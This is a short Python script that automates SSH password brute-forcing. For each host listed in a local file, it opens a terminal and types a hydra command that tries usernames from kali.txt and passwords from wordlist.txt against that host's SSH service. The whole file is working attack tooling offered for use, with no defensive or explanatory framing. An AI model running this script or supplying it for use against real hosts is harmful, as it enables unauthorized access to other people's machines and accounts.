import os
import pyautogui


if 'ssh_local.txt' in os.listdir():
    for el in open('ssh_local.txt').readlines():
        os.system(f'gnome-terminal')
        os.getcwd()
        # cd to our directory
        pyautogui.typewrite(f"cd {os.getcwd()}/ssh_bruteforce")
        pyautogui.press('enter')
        # bruteforce passwords
        pyautogui.typewrite(f"hydra -f -L kali.txt -P wordlist.txt ssh://{el.rstrip()}")
        pyautogui.press('enter')
